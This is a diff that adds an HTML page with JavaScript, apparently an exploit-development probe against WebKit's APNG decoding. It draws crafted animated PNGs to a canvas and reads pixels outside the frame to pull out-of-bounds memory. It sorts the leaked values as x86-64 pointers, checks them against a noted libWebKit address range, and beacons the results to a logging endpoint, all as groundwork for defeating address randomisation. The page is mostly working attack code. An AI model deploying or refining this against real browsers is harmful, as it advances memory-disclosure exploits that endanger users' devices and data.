@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V982B</title></head>
+<body><pre id="out">V982B — APNG OOB stability gate (G1/G3, read-only; no forge, no deref, no spray, no scan)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function qs(k,d){
+  try{ var m=location.search.match(new RegExp('[?&]'+k+'=([^&]+)')); return m?decodeURIComponent(m[1]):d; }
+  catch(e){ return d; }
+}
+function rid(){ return qs('cb','r'+Math.floor(Math.random()*1e6)); }
+var RUN=rid();
+function bk(tag,body){
+  try{ new Image().src='/beacon/V982B-'+tag+'?d='+encodeURIComponent(String(body).slice(0,700))+'&t='+Date.now()+'&s=1'; }catch(e){}
+}
+function hx(n){ var s=n.toString(16); return s.length<2?'0'+s:s; }
+function p32(d,w,x,y){ var i=(y*w+x)*4; return hx(d[i])+hx(d[i+1])+hx(d[i+2])+hx(d[i+3]); }
+// q is 8 bytes in ascending memory order (R,G,B,A,R,G,B,A of two adjacent pixels).
+// Reverse the byte pairs to get the little-endian numeric hex (x86-64 interpretation).
+function qLE(q){ var o=''; for(var i=14;i>=0;i-=2) o+=q.substr(i,2); return o; }
+function toBig(q){ try{ return BigInt('0x'+qLE(q)); }catch(e){ return null; } }
+var LOW_MIN=BigInt('0x10000');
+var LOW_MAX=BigInt('0x800000000000');       // < 2^47
+var HIGH_MIN=BigInt('0xffff800000000000');  // canonical high half
+var ALLONES=BigInt('0xffffffffffffffff');
+var KNOWN_LO=BigInt('0x800000000');         // documented libWebKit range (7.00-13.60)
+var KNOWN_HI=BigInt('0x900000000');
+var PAGE_MASK=BigInt('0xfff');
+
+function filler(q){
+  return q==='0000000000000000'
+      || q==='000000000000ee3f'
+      || q==='00ff00ff00ff00ff'
+      || q==='ff0000ffff0000ff'
+      || q.indexOf('aeaeaf')>=0      // covers aeaeaeaf and 00aeaeaf filler
+      || q.indexOf('aeaeaee5')>=0
+      || q.indexOf('0000ee3f')>=0;
+}
+function classify(q){
+  if(filler(q)) return 'f';
+  var v=toBig(q);
+  if(v===null) return 'x';
+  if(v<LOW_MIN||v===ALLONES) return 's';             // small / sentinel
+  if((v>=LOW_MIN&&v<LOW_MAX)||v>=HIGH_MIN) return 'c'; // canonical address shape
+  return 'n';                                          // non-canonical
+}
+function knownRange(q){ var v=toBig(q); return v!==null && v>=KNOWN_LO && v<KNOWN_HI; }
+function pageAligned(q){ var v=toBig(q); return v!==null && (v & PAGE_MASK)===BigInt(0); }
+
+function loadImg(src,n){
+  return new Promise(function(res,rej){
+    var im=new Image();
+    im.onload=function(){res(im)};
+    im.onerror=function(){rej(new Error('load-fail'))};
+    im.src=src+'?cb='+RUN+'_'+n+'_'+Math.random();
+  });
+}
+
+var ITERS=Math.max(4,Math.min(12,parseInt(qs('it','8'),10)||8));
+var XSPAN=8;
+var CASES=[
+  {name:'f128_fr16', src:'v946b_f128_fr16.apng', W:128, H:64, frW:16, frH:16},
+  {name:'f64_fr16',  src:'v946b_f64_fr16.apng',  W:64,  H:64, frW:16, frH:16},
+  {name:'f64_fr32',  src:'v946b_f64_fr32.apng',  W:64,  H:64, frW:32, frH:32}
+];
+
+function rowsFor(frH){ return [0,1,2,3,frH-1]; }
+function sameAll(a){
+  if(!a || a.length!==ITERS) return false;
+  for(var i=1;i<a.length;i++) if(a[i]!==a[0]) return false;
+  return true;
+}
+function push(map,key,q){ (map[key]||(map[key]=[])).push(q); }
+
+(async function(){
+  bk('BOOT', RUN+'|read-only stability gate|iters='+ITERS+'|windows=x[frW..frW+'+XSPAN+'] step2, y=0,1,2,3,frH-1|3 assets|no-forge/no-deref/no-spray/no-scan');
+  var samples={}, ctrl={}, loadErr=0;
+
+  for(var it=0; it<ITERS; it++){
+    for(var ci=0; ci<CASES.length; ci++){
+      var C=CASES[ci];
+      try{
+        var im=await loadImg(C.src,it);
+        var c=document.createElement('canvas'); c.width=C.W; c.height=C.H;
+        var ctx=c.getContext('2d'); ctx.clearRect(0,0,C.W,C.H); ctx.drawImage(im,0,0);
+        var d=ctx.getImageData(0,0,C.W,C.H).data;
+        var rows=rowsFor(C.frH), parts=[];
+        var xEnd=Math.min(C.W-2,C.frW+XSPAN);
+        for(var ri=0; ri<rows.length; ri++){
+          var y=rows[ri], row=[];
+          for(var x=C.frW; x<=xEnd; x+=2){
+            var q=p32(d,C.W,x,y)+p32(d,C.W,x+1,y);
+            push(samples, C.name+'|y'+y+'|x'+x, q);
+            row.push(q);
+          }
+          parts.push('y'+y+':'+row.join(','));
+        }
+        // controls: two safe in-frame pixels of row 0 (expected green 00ff00ff).
+        // Keep both pixels inside the frame: pair (frW-2, frW-1), never (frW-1, frW).
+        var c1x=Math.max(0,C.frW-2);
+        var c0=p32(d,C.W,0,0)+p32(d,C.W,1,0);
+        var c1=p32(d,C.W,c1x,0)+p32(d,C.W,c1x+1,0);
+        push(ctrl, C.name+'|0,0', c0);
+        push(ctrl, C.name+'|'+c1x+','+'0', c1);
+        bk('IT', RUN+'|'+C.name+'#'+it+'|'+parts.join(';'));
+      }catch(e){
+        loadErr++;
+        bk('IT-ERR', RUN+'|'+C.name+'#'+it+'|'+String(e&&e.message||e).slice(0,120));
+      }
+    }
+  }
+
+  // G1: per-offset stability within this load.
+  var keys=0, stable=[], canon=[], knowns=[], fillerStable=0, short=0;
+  for(var k in samples){
+    if(!Object.prototype.hasOwnProperty.call(samples,k)) continue;
+    keys++;
+    var s=samples[k];
+    if(s.length!==ITERS){ short++; continue; }
+    if(!sameAll(s)) continue;
+    var q=s[0], cl=classify(q);
+    if(cl==='f'){ fillerStable++; continue; }
+    var e=RUN+'|'+k+'|'+q+'|c='+cl+'|known='+(knownRange(q)?1:0)+'|pg='+(pageAligned(q)?1:0);
+    stable.push(e);
+    if(cl==='c') canon.push(e);
+    if(knownRange(q)) knowns.push(e);
+  }
+
+  // Controls validate the stability harness: stable expected-green pixels must be stable.
+  var ctrlOk=0, ctrlBad=0, ctrlBadList=[];
+  for(var ck in ctrl){
+    if(!Object.prototype.hasOwnProperty.call(ctrl,ck)) continue;
+    var cs=ctrl[ck];
+    if(sameAll(cs) && cs[0]==='00ff00ff00ff00ff') ctrlOk++;
+    else { ctrlBad++; if(ctrlBadList.length<6) ctrlBadList.push(ck+'='+(cs&&cs[0]||'?')); }
+  }
+
+  function flush(tag, arr){
+    for(var i=0;i<arr.length;i+=6) bk(tag, arr.slice(i,i+6).join(';'));
+  }
+  bk('STABLE_N', RUN+'|keys='+keys+'|stable='+stable.length+'|canon='+canon.length+'|known='+knowns.length+'|fillerStable='+fillerStable+'|short='+short+'|loadErr='+loadErr);
+  flush('STABLE', stable);
+  if(canon.length) flush('CANON', canon);
+  if(knowns.length) flush('KNOWN', knowns);
+  bk('CTRL', RUN+'|ok='+ctrlOk+'|bad='+ctrlBad+(ctrlBadList.length?'|'+ctrlBadList.join(';'):''));
+
+  var g1='FAIL';
+  if(ctrlBad>0 || ctrlOk===0) g1='INVALID';
+  else if(stable.length>0) g1='PASS';
+  var shape = canon.length ? 'CANON_SHAPE' : (stable.length ? 'NONCANON' : 'NONE');
+  bk('VERDICT', RUN+'|G1='+g1+'|G2=partial('+shape+')|G3=pending|stable='+stable.length+'|canon='+canon.length+'|known='+knowns.length+'|ctrlOk='+ctrlOk+'|ctrlBad='+ctrlBad+'|note=stable-within-load-only; run 3 loads then tools/analyze_v982b.py');
+  bk('DONE', RUN+'|complete|iters='+ITERS);
+  say('\nV982B complete. runs='+RUN+' g1='+g1+' stable='+stable.length+' canon='+canon.length+' known='+knowns.length);
+  say('This is NOT a pointer leak by itself. Run 2 more loads with different ?cb= then analyze.');
+})().catch(function(e){
+  bk('FATAL', RUN+'|'+String(e&&e.message||e).slice(0,160));
+  say('fatal '+e);
+});
+</script>
+</body></html>
